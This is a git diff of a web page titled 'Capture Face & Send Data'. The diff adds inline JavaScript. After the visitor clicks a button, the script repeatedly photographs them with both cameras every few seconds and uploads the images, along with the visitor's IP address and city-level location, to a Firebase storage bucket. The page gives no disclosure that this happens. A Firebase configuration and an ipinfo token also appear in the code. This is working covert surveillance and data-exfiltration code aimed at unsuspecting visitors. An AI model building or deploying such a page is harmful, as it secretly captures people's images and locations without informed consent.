@@ -4,12 +4,68 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yahmar - Capture Face & Send Data</title>
-    <!-- Link to external CSS file -->
-    <link rel="stylesheet" href="css/style.css">
-    <!-- Firebase SDK -->
+
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #000;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        button {
+            font-size: 22px;
+            padding: 20px 50px;
+            margin: 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 30px;
+            transition: 0.3s ease, transform 0.3s ease;
+            width: 250px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        button:hover {
+            background-color: #45a049;
+            transform: scale(1.1);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+        }
+        #denyButton {
+            background-color: #e74c3c;
+        }
+        #denyButton:hover {
+            background-color: #c0392b;
+        }
+        #video {
+            max-width: 90%;
+            max-height: 60vh;
+            border-radius: 10px;
+            margin-top: 30px;
+            display: none;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -18,9 +74,98 @@
         <button id="denyButton">Don't Allow</button>
     </div>
 
-    <video id="video" style="display:none;"></video>
+    <video id="video"></video>
 
-    <!-- Link to external JavaScript file -->
-    <script src="js/app.js"></script>
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
+            authDomain: "html-7fd9b.firebaseapp.com",
+            projectId: "html-7fd9b",
+            storageBucket: "html-7fd9b.appspot.com",
+            messagingSenderId: "1022361191925",
+            appId: "1:1022361191925:web:0f971d6e7c72cfc3aa0cbc",
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+        const auth = firebase.auth();
+
+        // DOM elements
+        const allowButton = document.getElementById("allowButton");
+        const denyButton = document.getElementById("denyButton");
+        const video = document.getElementById("video");
+
+        // Allow camera access and capture images
+        allowButton.onclick = function () {
+            auth.signInAnonymously().then(() => {
+                captureFromCamera('environment'); // Use the back camera
+            }).catch((error) => {
+                console.error("Authentication failed:", error);
+                alert("Authentication failed. Try again.");
+            });
+        };
+
+        // Redirect to YouTube on "Don't Allow"
+        denyButton.onclick = function () {
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Rickroll
+        };
+
+        // Capture from camera
+        function captureFromCamera(cameraType) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraType } })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.style.display = "block";
+                    video.play();
+
+                    setTimeout(() => {
+                        captureImage();
+                        stream.getTracks().forEach((track) => track.stop());
+                        captureFromCamera(cameraType === 'environment' ? 'user' : 'environment');
+                    }, 3000);
+                })
+                .catch(() => {
+                    alert("Camera permission denied. Redirecting...");
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                });
+        }
+
+        // Capture image
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                const storageRef = storage.ref();
+                const photoRef = storageRef.child('photos/photo_' + Date.now() + '.jpg');
+                photoRef.put(blob).then(() => {
+                    console.log('Photo uploaded successfully.');
+                    captureIPData();
+                }).catch((error) => {
+                    console.error("Error uploading photo:", error);
+                });
+            }, 'image/jpeg');
+        }
+
+        // Capture IP and upload data
+        function captureIPData() {
+            fetch('https://ipinfo.io?token=023890bc57338a')
+                .then((response) => response.json())
+                .then((data) => {
+                    const ipData = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`;
+                    const ipDataRef = storage.ref().child('ip_data/ip_' + Date.now() + '.txt');
+                    ipDataRef.putString(ipData).then(() => {
+                        console.log('IP Data uploaded successfully.');
+                    }).catch((error) => {
+                        console.error("Error uploading IP data:", error);
+                    });
+                });
+        }
+    </script>
 </body>
 </html>
